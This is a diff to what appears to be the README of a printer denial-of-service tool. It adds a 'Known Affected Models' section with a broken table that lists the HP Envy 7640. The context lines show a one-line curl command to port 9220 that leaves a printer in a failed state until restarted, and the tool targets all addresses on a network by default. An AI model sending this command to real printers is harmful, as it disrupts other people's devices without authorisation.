@@ -35,7 +35,17 @@ While the inner workings are more complicated, the exploit in its purest form is
 `curl [IP]:9220 -X 'open 99999999'`<br>
 As mentioned above, the printer will go into a failed state and remain in said state until restarted.
 
-### CLI Options
+## Known Affected Models
+<tbody>
+  <tr>
+    <th>MODEL</th>
+    <th>Vulnerable</th>
+    <th>Mass Printing</th>
+  </tr>
+</tbody>
+HP Envy 7640
+
+## CLI Options
 
 `-t`, `--target={IP}`       Specify a specific target rather than all addresses on the network.
 
